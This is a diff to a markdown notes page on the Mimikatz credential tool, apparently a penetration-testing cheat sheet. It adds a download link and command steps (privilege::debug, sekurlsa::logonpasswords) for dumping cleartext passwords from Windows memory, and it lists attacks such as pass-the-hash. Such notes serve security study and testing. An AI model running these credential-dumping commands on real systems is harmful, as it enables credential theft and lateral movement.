@@ -2,9 +2,8 @@
 [Article Link](https://www.varonis.com/blog/what-is-mimikatz)
 
 Mimikatz is an open-source application that allows users to view and save authentication credentials. 
-## Download
-* Source Code
-* 
+
+[Mimikatz Download Link](https://github.com/gentilkiwi/mimikatz/releases)
 
 ## Capabilities
 * Pass-the-Hash
@@ -20,3 +19,15 @@ Mimikatz is an open-source application that allows users to view and save authen
 * Pass-the-Cache
   * An attack similar to pass-the-ticket, but using save & encrypted data on *nix systems.
 
+## Usage
+
+*\~Always run Mimikatz as Administrator, even if logged into an Administrator account\~*
+
+### Extracting Clear Text Passowrds From Memory
+
+The module `sekurlsa` in Mimikatz allows you to dump passwords from RAM.
+
+#### Command Steps
+1. `mimikatz # privilege::debug` - This command checks to make sure you have the required permissions.
+2. `mimikatz # log name_log_file.log` - This command is used create a log of what you do, so you can save your work.
+3. `mimikatz # sekurlsa::logonpasswords` - This command will output all of the clear text passowrds on the host system. 
